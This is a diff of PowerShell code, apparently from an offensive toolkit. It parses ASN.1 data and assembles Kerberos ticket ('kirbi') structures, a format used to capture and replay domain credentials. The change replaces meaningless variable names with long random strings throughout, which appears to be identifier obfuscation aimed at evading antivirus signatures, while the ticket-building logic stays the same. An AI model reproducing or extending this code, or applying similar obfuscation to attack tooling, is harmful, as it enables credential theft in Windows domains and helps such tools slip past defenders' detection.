-        $TrashyMatch += $GateNasty[0]
-        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 89)..($TrashyMatch + $PlanesExcuse + 94)]
-        $TrashyMatch += $GateNasty[0]
-        $ReturnWicked = $AskEffect[($TrashyMatch + $PlanesExcuse + 88)]
-        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 89)..($TrashyMatch + $PlanesExcuse + 94)]
-        $TrashyMatch += $GateNasty[0]
-        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 89)..($TrashyMatch + $PlanesExcuse + 94)]
-        $TrashyMatch += $GateNasty[0]
-        $RushFog = $GateNasty[1]
-        [Byte[]]$SixGrade = $AskEffect[($TrashyMatch + $PlanesExcuse + 89)..($TrashyMatch + $PlanesExcuse + $RushFog + 88)]
-        [Byte[]]$MiceEnjoy = 0x04,0x82 + [System.BitConverter]::GetBytes($SixGrade.Count)[1..0] + $SixGrade
-        $MiceEnjoy = 0xA2,0x84 + [System.BitConverter]::GetBytes($MiceEnjoy.Count)[3..0] + $MiceEnjoy
-        $MiceEnjoy = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x12,0xA1,0x84,0x00,0x00,0x00,0x03,0x02,0x01 + $ReturnWicked + $MiceEnjoy
-        $MiceEnjoy = 0x30,0x84 + [System.BitConverter]::GetBytes($MiceEnjoy.Count)[3..0] + $MiceEnjoy
-        $MiceEnjoy = 0xA3,0x84 + [System.BitConverter]::GetBytes($MiceEnjoy.Count)[3..0] + $MiceEnjoy
-        [Byte[]]$JogPowder = 0x30,0x84 + [System.BitConverter]::GetBytes($CureScrew.Count)[3..0] + $CureScrew
-        $JogPowder = 0xA1,0x84 + [System.BitConverter]::GetBytes($JogPowder.Count)[3..0] + $JogPowder
-        $JogPowder = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x02 + $JogPowder
-        $JogPowder = 0x30,0x84 + [System.BitConverter]::GetBytes($JogPowder.Count)[3..0] + $JogPowder
-        $JogPowder = 0xA2,0x84 + [System.BitConverter]::GetBytes($JogPowder.Count)[3..0] + $JogPowder
-        [Byte[]]$ChunkyPlay = 0xA1,0x84 + [System.BitConverter]::GetBytes($UglySpace.Count)[3..0] + $UglySpace
-        $ChunkyPlay = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01 + $SilkReach + $ChunkyPlay
-        [Byte[]]$AuntMale = $ChunkyPlay + $JogPowder + $MiceEnjoy
-        $AuntMale = 0x30,0x84 + [System.BitConverter]::GetBytes($AuntMale.Count)[3..0] + $AuntMale
-        $AuntMale = 0x61,0x84 + [System.BitConverter]::GetBytes($AuntMale.Count)[3..0] + $AuntMale
-        $AuntMale = 0x30,0x84 + [System.BitConverter]::GetBytes($AuntMale.Count)[3..0] + $AuntMale
-        $AuntMale = 0xA2,0x84 + [System.BitConverter]::GetBytes($AuntMale.Count)[3..0] + $AuntMale
-        $AuntMale = 0xA1,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x16 + $AuntMale
-        $AuntMale = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01 + $KindlyBoring + $AuntMale
+        $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[4..9]
+        $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ = $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+        $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + 4)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + 9)]
+        $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ += $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+        $TgpNBuNfSlXhTuvhOPjKxUDRCJlATkdGOxsaiotTbf = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + 7)]
+        $SrfGbdAYIpQgofwtYPvJXJFxRiyaHvyoZWDnjSGpBZMOI = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $TgpNBuNfSlXhTuvhOPjKxUDRCJlATkdGOxsaiotTbf + 22)]
+        $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr = $TgpNBuNfSlXhTuvhOPjKxUDRCJlATkdGOxsaiotTbf + $SrfGbdAYIpQgofwtYPvJXJFxRiyaHvyoZWDnjSGpBZMOI
+        $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 74)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 79)]
+        $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ += $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+        $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 74)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 79)]
+        $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ += $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+        $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 74)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 79)]
+        $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ += $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+        $xeGLvLIBdGeZqvmNZUTrRfIDfwHozislmhCnRNZHtG = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 73)]
+        $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 74)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 79)]
+        $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ += $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+        $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 74)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 79)]
+        $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ += $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+        $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 74)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 79)]
+        $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ += $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+        $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 74)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 79)]
+        $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ += $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+        $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 74)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 79)]
+        $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ += $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+        $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 74)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 79)]
+        $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ += $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+        $ynuhvYfvJjtfeCeRMPjupDAbGp = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 73)]
+        $WVMvihlaObitjukDrisNHWdJeIHrCadzHfYATNEpLvli = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 75)]
+        [Byte[]]$mQMpRsWGaFgcUErfGXWPcXV = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 76)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + $WVMvihlaObitjukDrisNHWdJeIHrCadzHfYATNEpLvli + 75)]
+        $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr += $WVMvihlaObitjukDrisNHWdJeIHrCadzHfYATNEpLvli
+        $HGMDfTBruvghVLwiKVvrGhifCVpeZxlHvQzdK = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 88)]
+        [Byte[]]$PlZHlmjGbmPTLzAwndWwffbYddhlHABlDjv = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 89)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + $HGMDfTBruvghVLwiKVvrGhifCVpeZxlHvQzdK + 88)]
+        $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr += $HGMDfTBruvghVLwiKVvrGhifCVpeZxlHvQzdK
+        $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 89)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 94)]
+        $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ += $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+        $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 89)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 94)]
+        $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ += $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+        $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 89)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 94)]
+        $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ += $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+        $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 89)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 94)]
+        $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ += $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+        $COceLvvIPLeglaaGtGJYcrzNyNvCXhyPyZIAQZ = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 88)]
+        $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 89)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 94)]
+        $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ += $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+        $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 89)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 94)]
+        $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ += $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+        $xkUeeAgowppjnpcqyHlyVcbyLQWEMJeUSnCSojspVUQn = $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[1]
+        [Byte[]]$iGBCzkWRuKGSNhAxCIvDXsHSQYCWrgxDqMrZiZKIW = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 89)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + $xkUeeAgowppjnpcqyHlyVcbyLQWEMJeUSnCSojspVUQn + 88)]
+        [Byte[]]$DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh = 0x04,0x82 + [System.BitConverter]::GetBytes($iGBCzkWRuKGSNhAxCIvDXsHSQYCWrgxDqMrZiZKIW.Count)[1..0] + $iGBCzkWRuKGSNhAxCIvDXsHSQYCWrgxDqMrZiZKIW
+        $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh = 0xA2,0x84 + [System.BitConverter]::GetBytes($DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh.Count)[3..0] + $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh
+        $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x12,0xA1,0x84,0x00,0x00,0x00,0x03,0x02,0x01 + $COceLvvIPLeglaaGtGJYcrzNyNvCXhyPyZIAQZ + $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh
+        $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh = 0x30,0x84 + [System.BitConverter]::GetBytes($DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh.Count)[3..0] + $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh
+        $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh = 0xA3,0x84 + [System.BitConverter]::GetBytes($DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh.Count)[3..0] + $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh
+        [Byte[]]$rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN = 0x30,0x84 + [System.BitConverter]::GetBytes($PlZHlmjGbmPTLzAwndWwffbYddhlHABlDjv.Count)[3..0] + $PlZHlmjGbmPTLzAwndWwffbYddhlHABlDjv
+        $rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN = 0xA1,0x84 + [System.BitConverter]::GetBytes($rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN.Count)[3..0] + $rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN
+        $rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x02 + $rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN
+        $rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN = 0x30,0x84 + [System.BitConverter]::GetBytes($rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN.Count)[3..0] + $rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN
+        $rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN = 0xA2,0x84 + [System.BitConverter]::GetBytes($rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN.Count)[3..0] + $rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN
+        [Byte[]]$cBiKFEXRziLqcSvbkAToWH = 0xA1,0x84 + [System.BitConverter]::GetBytes($mQMpRsWGaFgcUErfGXWPcXV.Count)[3..0] + $mQMpRsWGaFgcUErfGXWPcXV
+        $cBiKFEXRziLqcSvbkAToWH = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01 + $ynuhvYfvJjtfeCeRMPjupDAbGp + $cBiKFEXRziLqcSvbkAToWH
+        [Byte[]]$RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV = $cBiKFEXRziLqcSvbkAToWH + $rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN + $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh
+        $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV = 0x30,0x84 + [System.BitConverter]::GetBytes($RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV.Count)[3..0] + $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV
+        $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV = 0x61,0x84 + [System.BitConverter]::GetBytes($RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV.Count)[3..0] + $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV
+        $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV = 0x30,0x84 + [System.BitConverter]::GetBytes($RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV.Count)[3..0] + $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV
+        $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV = 0xA2,0x84 + [System.BitConverter]::GetBytes($RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV.Count)[3..0] + $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV
+        $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV = 0xA1,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x16 + $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV
+        $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01 + $xeGLvLIBdGeZqvmNZUTrRfIDfwHozislmhCnRNZHtG + $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV
     
-        return $AuntMale
+        return $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV
     }
     
     function Get-KirbiPartThree
     {
-        param([Byte[]]$AskEffect)
+        param([Byte[]]$AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF)
     
-        $GateNasty = Get-ASN1Length $AskEffect[0..($TrashyMatch + 5)]
-        $TrashyMatch = $GateNasty[0]
-        $GateNasty = Get-ASN1Length $AskEffect[$TrashyMatch..($TrashyMatch + 5)]
-        $TrashyMatch += $GateNasty[0]
-        $GateNasty = Get-ASN1Length $AskEffect[$TrashyMatch..($TrashyMatch + 5)]
-        $TrashyMatch += $GateNasty[0]
-        $GateNasty = Get-ASN1Length $AskEffect[$TrashyMatch..($TrashyMatch + 5)]
-        $TrashyMatch += $GateNasty[0]
-        $GateNasty = Get-ASN1Length $AskEffect[$TrashyMatch..($TrashyMatch + 5)]
-        $TrashyMatch += $GateNasty[0]
-        [Byte[]]$PeepSmell = $AskEffect[($TrashyMatch + 11)..($TrashyMatch + 44)]
-        $SmokeEarn = $AskEffect[($TrashyMatch + 46)]
-        [Byte[]]$FalseCoil = $AskEffect[($TrashyMatch + 47)..($TrashyMatch + $SmokeEarn + 46)]
-        $SnailEarn = $AskEffect[($TrashyMatch + $SmokeEarn + 59)]
-        $PlanesExcuse = $SmokeEarn + $SnailEarn
-        [Byte[]]$WristDrag = $AskEffect[($TrashyMatch + $SmokeEarn + 60)..($TrashyMatch + $PlanesExcuse + 59)]
-        [Byte[]]$NimbleReport = $AskEffect[($TrashyMatch + $PlanesExcuse + 65)..($TrashyMatch + $PlanesExcuse + 68)]
-        [Byte[]]$TugIll = $AskEffect[($TrashyMatch + $PlanesExcuse + 71)..($TrashyMatch + $PlanesExcuse + 87)]
-        [Byte[]]$CreepySmoke = $AskEffect[($TrashyMatch + $PlanesExcuse + 90)..($TrashyMatch + $PlanesExcuse + 106)]
-        [Byte[]]$OrderBury = $AskEffect[($TrashyMatch + $PlanesExcuse + 109)..($TrashyMatch + $PlanesExcuse + 125)]
-        $MuteTricky = $AskEffect[($TrashyMatch + $PlanesExcuse + 127)]
-        [Byte[]]$UnablePan = $AskEffect[($TrashyMatch + $PlanesExcuse + 128)..($TrashyMatch + $PlanesExcuse + $MuteTricky + 127)]
-        $PlanesExcuse += $MuteTricky
-        $DirtVague = $AskEffect[($TrashyMatch + $PlanesExcuse + 140)]
-        [Byte[]]$CureScrew = $AskEffect[($TrashyMatch + $PlanesExcuse + 141)..($TrashyMatch + $PlanesExcuse + $DirtVague + 140)]
-        [Byte[]]$MiceEnjoy = 0x30,0x84 + [System.BitConverter]::GetBytes($CureScrew.Count)[3..0] + $CureScrew
-        $MiceEnjoy = 0xA1,0x84 + [System.BitConverter]::GetBytes($MiceEnjoy.Count)[3..0] + $MiceEnjoy
-        $MiceEnjoy = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x02 + $MiceEnjoy
-        $MiceEnjoy = 0x30,0x84 + [System.BitConverter]::GetBytes($MiceEnjoy.Count)[3..0] + $MiceEnjoy
-        $MiceEnjoy = 0xA9,0x84 + [System.BitConverter]::GetBytes($MiceEnjoy.Count)[3..0] + $MiceEnjoy
-        $MiceEnjoy = 0xA8,0x84 + [System.BitConverter]::GetBytes($UnablePan.Count)[3..0] + $UnablePan + $MiceEnjoy
-        $MiceEnjoy = 0xA7,0x84 + [System.BitConverter]::GetBytes($OrderBury.Count)[3..0] + $OrderBury + $MiceEnjoy
-        $MiceEnjoy = 0xA6,0x84 + [System.BitConverter]::GetBytes($CreepySmoke.Count)[3..0] + $CreepySmoke + $MiceEnjoy
-        $MiceEnjoy = 0xA5,0x84 + [System.BitConverter]::GetBytes($TugIll.Count)[3..0] + $TugIll + $MiceEnjoy
-        $MiceEnjoy = 0xA3,0x84,0x00,0x00,0x00,0x07,0x03,0x05,0x00 + $NimbleReport + $MiceEnjoy
-        [Byte[]]$JogPowder = 0x30,0x84 + [System.BitConverter]::GetBytes($WristDrag.Count)[3..0] + $WristDrag
-        $JogPowder = 0xA1,0x84 + [System.BitConverter]::GetBytes($JogPowder.Count)[3..0] + $JogPowder
-        $JogPowder = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x01 + $JogPowder
-        $JogPowder = 0x30,0x84 + [System.BitConverter]::GetBytes($JogPowder.Count)[3..0] + $JogPowder
-        $JogPowder = 0xA2,0x84 + [System.BitConverter]::GetBytes($JogPowder.Count)[3..0] + $JogPowder
-        $JogPowder = 0xA1,0x84 + [System.BitConverter]::GetBytes($FalseCoil.Count)[3..0] + $FalseCoil + $JogPowder
-        [Byte[]]$ChunkyPlay = 0xA1,0x84 + [System.BitConverter]::GetBytes($PeepSmell.Count)[3..0] + $PeepSmell
-        $ChunkyPlay = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x12 + $ChunkyPlay
-        $ChunkyPlay = 0x30,0x84 + [System.BitConverter]::GetBytes($ChunkyPlay.Count)[3..0] + $ChunkyPlay
-        $ChunkyPlay = 0xA0,0x84 + [System.BitConverter]::GetBytes($ChunkyPlay.Count)[3..0] + $ChunkyPlay
-        [Byte[]]$AuntMale = $ChunkyPlay + $JogPowder + $MiceEnjoy
-        $AuntMale = 0x30,0x84 + [System.BitConverter]::GetBytes($AuntMale.Count)[3..0] + $AuntMale
-        $AuntMale = 0x30,0x84 + [System.BitConverter]::GetBytes($AuntMale.Count)[3..0] + $AuntMale
-        $AuntMale = 0xA0,0x84 + [System.BitConverter]::GetBytes($AuntMale.Count)[3..0] + $AuntMale
-        $AuntMale = 0x30,0x84 + [System.BitConverter]::GetBytes($AuntMale.Count)[3..0] + $AuntMale
-        $AuntMale = 0x7D,0x84 + [System.BitConverter]::GetBytes($AuntMale.Count)[3..0] + $AuntMale
-        $AuntMale = 0x04,0x82 + [System.BitConverter]::GetBytes($AuntMale.Count)[1..0] + $AuntMale
-        $AuntMale = 0xA2,0x84 + [System.BitConverter]::GetBytes($AuntMale.Count)[3..0] + $AuntMale
